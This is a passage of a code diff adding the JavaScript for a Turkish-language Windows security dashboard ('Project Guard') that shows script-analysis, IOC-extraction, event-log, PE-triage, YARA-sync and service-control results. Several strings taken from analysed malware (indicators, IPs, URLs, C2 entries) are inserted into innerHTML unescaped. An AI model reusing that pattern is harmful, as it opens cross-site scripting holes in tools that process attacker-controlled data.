+            document.getElementById('script-code-input').value = sample;
+            showToast('Örnek AMSI bypass ve indirme beşiği kodu yüklendi.');
+        }
+
+        async function analyzeScriptLive() {
+            const code = document.getElementById('script-code-input').value.trim();
+            const filePath = document.getElementById('script-file-path').value.trim();
+
+            if (!code && !filePath) {
+                alert('Lütfen analiz edilecek betik kodunu veya dosya yolunu girin.');
+                return;
+            }
+
+            try {
+                const res = await fetch('/api/script/analyze', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code: code, filename: filePath || 'script.ps1' })
+                });
+                const data = await res.json();
+                const container = document.getElementById('script-result-container');
+                container.style.display = 'block';
+
+                const rep = data.result;
+                if (!rep) {
+                    document.getElementById('stat-script-threat').innerText = 'Temiz';
+                    document.getElementById('stat-script-threat').style.color = 'var(--emerald)';
+                    document.getElementById('stat-script-type').innerText = 'Script Türü: Normal';
+                    document.getElementById('stat-script-sev').innerText = 'Temiz';
+                    document.getElementById('stat-script-sev').style.color = 'var(--emerald)';
+                    document.getElementById('stat-script-mitre').innerText = 'MITRE: Yok';
+                    document.getElementById('stat-script-indicators-count').innerText = '0';
+                    document.getElementById('script-deob-card').style.display = 'none';
+                    document.getElementById('script-indicators-list').innerHTML = `<li style="color:var(--emerald); padding:10px;">&#10004; Betikte bilinen hiçbir AMSI bypass veya zararlı indirme beşiği saptanmadı.</li>`;
+                    showToast('Analiz tamamlandı: Betik Temiz.');
+                    return;
+                }
+
+                document.getElementById('stat-script-threat').innerText = rep.threat_name;
+                document.getElementById('stat-script-threat').style.color = 'var(--rose)';
+                document.getElementById('stat-script-type').innerText = 'Script Türü: ' + rep.file_type;
+                document.getElementById('stat-script-sev').innerText = rep.severity;
+                document.getElementById('stat-script-sev').style.color = rep.severity === 'CRITICAL' ? 'var(--rose)' : 'var(--amber)';
+                document.getElementById('stat-script-mitre').innerText = 'MITRE: ' + rep.mitre_technique;
+                document.getElementById('stat-script-indicators-count').innerText = rep.matched_indicators.length;
+
+                // De-obfuscated payload
+                const deobCard = document.getElementById('script-deob-card');
+                if (rep.deobfuscated_payload) {
+                    deobCard.style.display = 'block';
+                    document.getElementById('script-deob-text').innerText = rep.deobfuscated_payload;
+                } else {
+                    deobCard.style.display = 'none';
+                }
+
+                // Indicators
+                const list = document.getElementById('script-indicators-list');
+                list.innerHTML = '';
+                rep.matched_indicators.forEach(ind => {
+                    const li = document.createElement('li');
+                    li.style.background = 'rgba(244,63,94,0.08)';
+                    li.style.border = '1px solid rgba(244,63,94,0.25)';
+                    li.style.borderRadius = '6px';
+                    li.style.padding = '8px 12px';
+                    li.style.color = '#fff';
+                    li.innerHTML = `<span style="color:var(--rose); font-weight:700;">&#9888;</span> ${ind}`;
+                    list.appendChild(li);
+                });
+
+                showToast(`Tehdit saptandı: ${rep.threat_name} (${rep.severity})`);
+            } catch (e) {
+                alert('Analiz hatası: ' + e);
+            }
+        }
+
+        async function extractIocsLive() {
+            const target = document.getElementById('ioc-target-input').value.trim();
+            if (!target) {
+                alert('Lütfen dosya yolu veya analiz edilecek metin girin.');
+                return;
+            }
+
+            try {
+                const res = await fetch('/api/ioc/extract', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target })
+                });
+                const rep = await res.json();
+                if (rep.error) {
+                    alert('Hata: ' + rep.error);
+                    return;
+                }
+
+                const container = document.getElementById('ioc-result-container');
+                container.style.display = 'block';
+
+                document.getElementById('stat-ioc-total').innerText = (rep.total_strings_extracted || 0).toLocaleString();
+                document.getElementById('stat-ioc-c2').innerText = (rep.confirmed_c2_ips ? rep.confirmed_c2_ips.length : 0) + ' Eşleşme';
+                document.getElementById('stat-ioc-c2').style.color = (rep.confirmed_c2_ips && rep.confirmed_c2_ips.length > 0) ? 'var(--rose)' : 'var(--emerald)';
+                document.getElementById('stat-ioc-ips').innerText = (rep.public_ips ? rep.public_ips.length : 0) + ' IP';
+                document.getElementById('stat-ioc-urls-wallets').innerText = (rep.urls ? rep.urls.length : 0) + ' URL, ' + (rep.crypto_wallets ? rep.crypto_wallets.length : 0) + ' Cüzdan';
+
+                // C2 Table
+                const c2Card = document.getElementById('ioc-c2-card');
+                const c2Body = document.getElementById('ioc-c2-table-body');
+                c2Body.innerHTML = '';
+                if (rep.confirmed_c2_ips && rep.confirmed_c2_ips.length > 0) {
+                    c2Card.style.display = 'block';
+                    rep.confirmed_c2_ips.forEach(c => {
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `
+                            <td><strong style="color:var(--rose);">${c.indicator}</strong></td>
+                            <td><span class="badge-status" style="background:rgba(244,63,94,0.15); color:var(--rose);">${c.ioc_type}</span></td>
+                            <td><span style="color:var(--amber); font-weight:600;">${c.threat_tag || 'Feodo Botnet'}</span></td>
+                            <td><span style="color:var(--cyan);">Abuse.ch Feodo Tracker</span></td>
+                        `;
+                        c2Body.appendChild(tr);
+                    });
+                } else {
+                    c2Card.style.display = 'none';
+                }
+
+                // IPs
+                const ipsList = document.getElementById('ioc-ips-list');
+                ipsList.innerHTML = '';
+                if (!rep.public_ips || rep.public_ips.length === 0) {
+                    ipsList.innerHTML = '<span style="color:var(--text-muted); padding:10px;">Hiçbir genel (public) IP adresi bulunamadı.</span>';
+                } else {
+                    rep.public_ips.forEach(ip => {
+                        const div = document.createElement('div');
+                        div.style.padding = '4px 8px';
+                        div.style.background = 'rgba(255,255,255,0.04)';
+                        div.style.borderRadius = '4px';
+                        div.innerHTML = `<span style="color:var(--amber);">&#128205;</span> ${ip}`;
+                        ipsList.appendChild(div);
+                    });
+                }
+
+                // URLs
+                const urlsList = document.getElementById('ioc-urls-list');
+                urlsList.innerHTML = '';
+                if (!rep.urls || rep.urls.length === 0) {
+                    urlsList.innerHTML = '<span style="color:var(--text-muted); padding:10px;">Hiçbir URL bulunamadı.</span>';
+                } else {
+                    rep.urls.forEach(u => {
+                        const div = document.createElement('div');
+                        div.style.padding = '4px 8px';
+                        div.style.background = 'rgba(255,255,255,0.04)';
+                        div.style.borderRadius = '4px';
+                        div.style.wordBreak = 'break-all';
+                        div.innerHTML = `<span style="color:var(--cyan);">&#127760;</span> ${u}`;
+                        urlsList.appendChild(div);
+                    });
+                }
+
+                // Wallets and keywords
+                const wk = document.getElementById('ioc-wallets-keywords');
+                wk.innerHTML = '';
+                if (rep.crypto_wallets) {
+                    rep.crypto_wallets.forEach(w => {
+                        const span = document.createElement('span');
+                        span.className = 'badge-status';
+                        span.style.background = 'rgba(245,158,11,0.15)';
+                        span.style.color = 'var(--amber)';
+                        span.style.borderColor = 'rgba(245,158,11,0.3)';
+                        span.innerText = `💰 [${w.ioc_type}] ${w.indicator}`;
+                        wk.appendChild(span);
+                    });
+                }
+                if (rep.suspicious_keywords) {
+                    rep.suspicious_keywords.forEach(k => {
+                        const span = document.createElement('span');
+                        span.className = 'badge-status';
+                        span.style.background = 'rgba(244,63,94,0.15)';
+                        span.style.color = 'var(--rose)';
+                        span.style.borderColor = 'rgba(244,63,94,0.3)';
+                        span.innerText = `⚠ ${k}`;
+                        wk.appendChild(span);
+                    });
+                }
+                if ((!rep.crypto_wallets || rep.crypto_wallets.length === 0) && (!rep.suspicious_keywords || rep.suspicious_keywords.length === 0)) {
+                    wk.innerHTML = '<span style="color:var(--text-muted); padding:10px;">Cüzdan veya şüpheli API anahtar kelimesi bulunamadı.</span>';
+                }
+
+                showToast(`IOC ayıklama tamamlandı: ${rep.public_ips ? rep.public_ips.length : 0} IP, ${rep.urls ? rep.urls.length : 0} URL.`);
+            } catch (e) {
+                alert('IOC hatası: ' + e);
+            }
+        }
+
+        // ==================== EVENT LOG HUNTER ====================
+        let cachedEventLogs = [];
+
+        async function loadEventLogs(forceRefresh) {
+            const btn = document.getElementById('btn-refresh-eventlogs');
+            if (btn) btn.innerHTML = '<span>&#8987;</span> Olaylar Sorgulanıyor...';
+
+            try {
+                const res = await fetch('/api/eventlogs');
+                const data = await res.json();
+                if (btn) btn.innerHTML = '<span>&#8635;</span> Olay Günlüklerini Tara';
+
+                if (data.error) {
+                    alert('Hata: ' + data.error);
+                    return;
+                }
+
+                cachedEventLogs = data.records || [];
+                renderEventLogs(cachedEventLogs);
+
+                // Stats calculation
+                const total = cachedEventLogs.length;
+                const susp = cachedEventLogs.filter(r => r.is_suspicious).length;
+                const ps = cachedEventLogs.filter(r => r.event_id === 4104).length;
+                const def = cachedEventLogs.filter(r => r.event_id === 1116 || r.event_id === 1117).length;
+
+                document.getElementById('stat-evlog-total').innerText = total;
+                document.getElementById('stat-evlog-susp').innerText = susp;
+                document.getElementById('stat-evlog-ps').innerText = ps;
+                document.getElementById('stat-evlog-def').innerText = def;
+
+                if (forceRefresh) {
+                    showToast(`Olay günlükleri güncellendi: ${total} olay incelendi, ${susp} şüpheli aktivite.`);
+                }
+            } catch (e) {
+                if (btn) btn.innerHTML = '<span>&#8635;</span> Olay Günlüklerini Tara';
+                console.error('Olay günlüğü yüklenemedi:', e);
+            }
+        }
+
+        function filterEventLogTab(filter) {
+            if (!cachedEventLogs || cachedEventLogs.length === 0) return;
+
+            if (filter === 'all') {
+                renderEventLogs(cachedEventLogs);
+            } else if (filter === 'threats') {
+                renderEventLogs(cachedEventLogs.filter(r => r.is_suspicious));
+            } else if (filter === 'ps') {
+                renderEventLogs(cachedEventLogs.filter(r => r.event_id === 4104));
+            } else if (filter === 'def') {
+                renderEventLogs(cachedEventLogs.filter(r => r.event_id === 1116 || r.event_id === 1117));
+            } else if (filter === 'sec') {
+                renderEventLogs(cachedEventLogs.filter(r => r.event_id === 1102));
+            }
+        }
+
+        function renderEventLogs(records) {
+            const tbody = document.getElementById('evlog-table-body');
+            tbody.innerHTML = '';
+
+            if (records.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 25px;">Kayıt bulunamadı veya henüz olay günlüğü oluşmadı.</td></tr>';
+                return;
+            }
+
+            records.forEach(r => {
+                const tr = document.createElement('tr');
+                if (r.is_suspicious) {
+                    tr.style.background = 'rgba(244, 63, 94, 0.08)';
+                }
+
+                const sevColor = r.severity === 'Critical' ? 'var(--rose)' : (r.severity === 'Warning' ? 'var(--amber)' : 'var(--text-muted)');
+                const idBadge = r.is_suspicious 
+                    ? `<span class="badge-status" style="background:rgba(244,63,94,0.2); color:var(--rose);">${r.event_id}</span>`
+                    : `<span class="badge-status" style="background:rgba(6,182,212,0.15); color:var(--cyan);">${r.event_id}</span>`;
+
+                tr.innerHTML = `
+                    <td>${idBadge}</td>
+                    <td style="font-size: 11.5px; color: var(--text-muted); white-space: nowrap;">${r.time_created.substring(0, 19).replace('T', ' ')}</td>
+                    <td><strong style="color:#fff; font-size:12px;">${r.source}</strong></td>
+                    <td><span style="color:${sevColor}; font-weight:700;">${r.severity}</span></td>
+                    <td style="font-size: 12px; color: ${r.is_suspicious ? 'var(--rose)' : 'var(--text-muted)'};">${r.details}</td>
+                    <td style="font-family: monospace; font-size: 11px; max-width: 320px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #cbd5e1;" title="${escapeHtml(r.message_preview)}">${escapeHtml(r.message_preview)}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        // ==================== PE DEEP TRIAGE ====================
+        async function triagePeLive() {
+            const target = document.getElementById('triage-path-input').value.trim();
+            if (!target) {
+                alert('Lütfen analiz edilecek bir dosya yolu girin.');
+                return;
+            }
+
+            const btn = document.getElementById('btn-triage-run');
+            btn.innerHTML = '<span>&#8987;</span> Triyaj Yapılıyor...';
+            btn.disabled = true;
+
+            try {
+                const res = await fetch('/api/triage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ path: target })
+                });
+                const rep = await res.json();
+                btn.innerHTML = '<span>&#128300;</span> Derin Triyaj Başlat';
+                btn.disabled = false;
+
+                if (rep.error) {
+                    alert('Triyaj hatası: ' + rep.error);
+                    return;
+                }
+
+                document.getElementById('triage-result-container').style.display = 'block';
+
+                // Threat Score
+                const scoreEl = document.getElementById('triage-threat-score');
+                scoreEl.innerText = rep.threat_score + ' / 100';
+                scoreEl.style.color = rep.threat_score >= 70 ? 'var(--rose)' : (rep.threat_score >= 40 ? 'var(--amber)' : 'var(--emerald)');
+                document.getElementById('triage-verdict').innerText = rep.verdict;
+
+                // Entropy
+                document.getElementById('triage-entropy-val').innerText = rep.overall_entropy.toFixed(2) + ' / 8.00';
+
+                // Arch & Entrypoint
+                document.getElementById('triage-arch').innerText = rep.is_pe ? (rep.is_64bit ? '64-bit (x64) PE' : '32-bit (x86) PE') : 'NON-PE Binary';
+                document.getElementById('triage-entrypoint').innerText = 'Entry: 0x' + rep.entry_point.toString(16);
+
+                // Caps count
+                document.getElementById('triage-caps-count').innerText = rep.capabilities.length + ' Yetenek';
+
+                // Section table
+                const secBody = document.getElementById('triage-sections-body');
+                secBody.innerHTML = '';
+                if (!rep.sections || rep.sections.length === 0) {
+                    secBody.innerHTML = '<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 15px;">Standart PE bölüm tablosu bulunamadı.</td></tr>';
+                } else {
+                    rep.sections.forEach(s => {
+                        const tr = document.createElement('tr');
+                        if (s.is_suspicious) tr.style.background = 'rgba(244,63,94,0.07)';
+
+                        const entPercent = Math.min(100, Math.round((s.entropy / 8.0) * 100));
+                        const entColor = s.entropy > 7.1 ? 'var(--rose)' : (s.entropy > 6.2 ? 'var(--amber)' : 'var(--emerald)');
+
+                        tr.innerHTML = `
+                            <td><strong style="color:#fff; font-family:monospace;">${s.name}</strong></td>
+                            <td style="font-size:12px; color:var(--text-muted);">${s.virtual_size.toLocaleString()} B</td>
+                            <td style="font-size:12px; color:var(--text-muted);">${s.raw_size.toLocaleString()} B</td>
+                            <td style="min-width: 140px;">
+                                <div style="display:flex; align-items:center; gap:8px;">
+                                    <div style="flex:1; height:7px; background:rgba(255,255,255,0.1); border-radius:4px; overflow:hidden;">
+                                        <div style="width:${entPercent}%; height:100%; background:${entColor};"></div>
+                                    </div>
+                                    <span style="font-size:11.5px; font-weight:700; color:${entColor}; font-family:monospace;">${s.entropy.toFixed(2)}</span>
+                                </div>
+                            </td>
+                            <td>
+                                <span class="pill ${s.is_executable ? 'pill-threat' : 'pill-clean'}" style="font-size:10px;">${s.is_executable ? 'EXEC' : 'NOEXEC'}</span>
+                                <span class="pill ${s.is_writable ? 'pill-threat' : 'pill-clean'}" style="font-size:10px;">${s.is_writable ? 'WRITE' : 'READONLY'}</span>
+                            </td>
+                            <td><span style="font-size:12px; color:${s.is_suspicious ? 'var(--rose)' : 'var(--text-muted)'}; font-weight:${s.is_suspicious ? '600' : 'normal'};">${s.status}</span></td>
+                        `;
+                        secBody.appendChild(tr);
+                    });
+                }
+
+                // Capabilities
+                const capsGrid = document.getElementById('triage-capabilities-grid');
+                capsGrid.innerHTML = '';
+                if (!rep.capabilities || rep.capabilities.length === 0) {
+                    capsGrid.innerHTML = '<span style="color:var(--text-muted); padding:10px;">Belirgin bir zararlı veya şüpheli ATT&CK API kümesi saptanmadı.</span>';
+                } else {
+                    rep.capabilities.forEach(c => {
+                        const card = document.createElement('div');
+                        card.style.background = 'rgba(255,255,255,0.03)';
+                        card.style.border = '1px solid ' + (c.severity === 'Critical' ? 'rgba(244,63,94,0.4)' : 'rgba(245,158,11,0.4)');
+                        card.style.borderRadius = '9px';
+                        card.style.padding = '12px 14px';
+
+                        card.innerHTML = `
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+                                <span style="font-size:11px; font-weight:700; color:var(--cyan); text-transform:uppercase;">${c.category}</span>
+                                <span class="badge-status" style="background:${c.severity === 'Critical' ? 'rgba(244,63,94,0.2)' : 'rgba(245,158,11,0.2)'}; color:${c.severity === 'Critical' ? 'var(--rose)' : 'var(--amber)'}; font-size:10px;">${c.severity}</span>
+                            </div>
+                            <div style="font-size:13.5px; font-weight:600; color:#fff; margin-bottom:6px;">${c.technique}</div>
+                            <div style="font-size:11.5px; color:var(--text-muted); margin-bottom:8px;">Taktik: ${c.tactic}</div>
+                            <div style="font-size:11.5px; font-family:monospace; color:var(--amber); word-break:break-all;">Eşleşen API'ler: ${c.matched_apis.join(', ')}</div>
+                        `;
+                        capsGrid.appendChild(card);
+                    });
+                }
+
+                // Notes
+                const notesList = document.getElementById('triage-notes-list');
+                notesList.innerHTML = '';
+                rep.summary_notes.forEach(n => {
+                    const li = document.createElement('li');
+                    li.innerText = n;
+                    notesList.appendChild(li);
+                });
+
+                showToast(`PE Triyajı tamamlandı: Skor ${rep.threat_score}/100 (${rep.verdict})`);
+            } catch (e) {
+                btn.innerHTML = '<span>&#128300;</span> Derin Triyaj Başlat';
+                btn.disabled = false;
+                alert('Triyaj hatası: ' + e);
+            }
+        }
+
+        // ==================== YARA COMMUNITY RULES SYNC ====================
+        async function syncYaraCommunityRules() {
+            showToast('Topluluk YARA kuralları indiriliyor ve derleniyor...');
+            try {
+                const res = await fetch('/api/yara/sync', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(data.stats.message);
+                    loadStatus();
+                } else {
+                    alert('Senkronizasyon hatası: ' + data.error);
+                }
+            } catch (e) {
+                alert('YARA senkronizasyon bağlantı hatası: ' + e);
+            }
+        }
+
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+        }
+
+        // ==================== WINDOWS SERVICE MANAGEMENT ====================
+        async function loadServiceStatus(showMsg) {
+            try {
+                const res = await fetch('/api/service/status');
+                const st = await res.json();
+                const pill = document.getElementById('svc-status-pill');
+                if (st.is_installed) {
+                    if (st.state === 'RUNNING') {
+                        pill.className = 'pill pill-clean';
+                        pill.innerText = 'ÇALIŞIYOR (RUNNING) [OK]';
+                        pill.style.color = 'var(--emerald)';
+                    } else if (st.state === 'STOPPED') {
+                        pill.className = 'pill pill-warning';
+                        pill.innerText = 'DURDURULDU (STOPPED)';
+                        pill.style.color = 'var(--amber)';
+                    } else {
+                        pill.className = 'pill';
+                        pill.innerText = st.state;
+                    }
+                } else {
+                    pill.className = 'pill pill-threat';
+                    pill.innerText = 'YÜKLÜ DEĞİL (CLI: guard service install)';
+                    pill.style.color = 'var(--rose)';
+                }
+                if (showMsg) showToast('Windows Hizmet durumu güncellendi: ' + st.state);
+            } catch (e) {
+                console.error('Hizmet durumu sorgulanamadı:', e);
+            }
+        }
+
+        async function startWindowsService() {
+            showToast('Windows Hizmeti başlatılıyor...');
+            try {
+                const res = await fetch('/api/service/start', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast('Project Guard Hizmeti başarıyla başlatıldı!');
+                    loadServiceStatus();
+                } else {
+                    alert('Hizmet başlatma uyarısı: ' + (data.error || 'Bilinmeyen hata (Yönetici yetkisi gerektirebilir).'));
+                }
+            } catch (e) {
+                alert('Hizmet başlatma hatası: ' + e);
+            }
+        }
+
+        async function stopWindowsService() {
+            showToast('Windows Hizmeti durduruluyor...');
+            try {
+                const res = await fetch('/api/service/stop', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast('Project Guard Hizmeti durduruldu.');
+                    loadServiceStatus();
+                } else {
+                    alert('Hizmet durdurma uyarısı: ' + (data.error || 'Bilinmeyen hata'));
+                }
+            } catch (e) {
+                alert('Hizmet durdurma hatası: ' + e);
+            }
+        }
+
+        // Ilk yukleme
+        loadStatus();
+    </script>
+</body>
+</html>
